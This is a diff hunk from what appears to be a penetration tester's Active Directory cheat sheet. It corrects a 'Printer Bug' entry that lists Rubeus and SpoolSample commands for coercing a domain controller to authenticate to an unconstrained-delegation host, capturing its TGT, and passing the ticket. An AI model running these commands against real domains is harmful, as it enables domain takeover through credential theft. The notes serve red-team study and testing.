@@ -191,7 +191,7 @@ PrivEsc
     
   Printer Bug (Get DC TGT from Unconstrained Delegation machine)
       Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
-      Spoolsample.exe DC01.FQDN Host_running_rubeus.fqdn
+      Spoolsample.exe \\DC01.FQDN \\UnConstrainedDelegation.FQDN
       Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
 
   Schedule Tasks/Trusted Installer
